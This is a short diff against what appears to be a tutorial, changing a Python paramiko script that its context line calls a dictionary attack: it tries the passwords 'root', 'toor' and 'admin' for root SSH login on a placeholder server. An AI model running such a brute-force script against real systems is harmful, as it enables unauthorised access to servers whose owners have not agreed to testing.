@@ -148,7 +148,6 @@ We can make a simple dictionary attack with the following script:
 import paramiko
 
 host = "<SERVER_IP>"
-port = 22
 username = "root"
 passwords = ["root", "toor", "admin"]
 
@@ -156,7 +155,7 @@ for password in passwords:
     try:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(host, port=port, username=username, password=password)
+        client.connect(host, port=22, username=username, password=password)
         print(f"Successfully connected to {host} with password: {password}")
         break
     except paramiko.AuthenticationException:
